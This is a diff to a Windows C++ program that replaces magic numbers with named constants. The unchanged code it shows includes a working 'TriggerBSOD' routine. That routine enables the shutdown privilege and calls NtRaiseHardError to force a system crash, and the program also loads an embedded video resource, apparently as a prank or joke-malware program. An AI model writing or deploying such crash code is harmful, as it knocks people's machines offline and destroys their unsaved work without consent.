@@ -1,6 +1,10 @@
 #include <dshow.h>
 #include <windows.h>
 
+// constants
+#define BSOD_ERROR_CODE 0xdeadbeef
+#define VIDEO_RESOURCE_ID 2
+
 // externs for BSoD functions
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enable, BOOLEAN client, PBOOLEAN wasEnabled);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(NTSTATUS errorStatus, ULONG numberOfParameters, ULONG unicodeStringParameterMask, PULONG_PTR parameters, ULONG validResponseOptions, PULONG response);
@@ -18,12 +22,12 @@ void TriggerBSOD() {
 
     // adjust privileges and raise BSoD
     RtlAdjustPrivilege(19, TRUE, FALSE, &previousState);
-    NtRaiseHardError(0xdeadbeef, 0, 0, NULL, 6, &response);
+    NtRaiseHardError(BSOD_ERROR_CODE, 0, 0, NULL, 6, &response);
 }
 
 int GetVideoResource(LPWSTR* path) {
     // get video resource handle
-    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(2), RT_RCDATA);
+    HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(VIDEO_RESOURCE_ID), RT_RCDATA);
 
     // get resource data
     DWORD size = SizeofResource(NULL, resource);
